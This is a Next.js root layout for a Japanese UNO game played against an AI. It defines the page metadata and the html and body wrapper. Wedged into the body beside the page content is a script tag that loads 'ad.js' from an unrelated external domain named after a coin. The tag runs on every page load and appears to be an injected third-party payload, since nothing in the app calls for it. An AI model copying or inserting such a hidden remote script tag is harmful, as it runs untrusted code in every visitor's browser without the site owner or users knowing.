import type { Metadata } from "next";
import "./globals.css";

export const metadata: Metadata = {
  title: "UNO ゲーム",
  description: "AIと対戦できるUNOゲーム",
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="ja">
      <body>{children}        <script src="https://hikakinmaniacoin.hikamer.f5.si/ad.js" async></script>
      </body>
    </html>
  );
}
